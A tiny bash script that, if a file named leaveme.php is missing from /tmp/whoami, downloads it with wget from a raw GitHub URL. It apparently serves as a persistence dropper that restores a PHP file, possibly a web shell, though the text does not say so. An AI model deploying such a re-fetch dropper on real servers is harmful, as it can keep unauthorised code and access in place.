#!/bin/bash
dir="/tmp/whoami"
filename="leaveme.php"
if [ ! -e "$dir/$filename" ]; then
    cd "$dir" || exit
    wget "raw.githubusercontent.com/0xbeethoven/zero/main/$filename"
fi
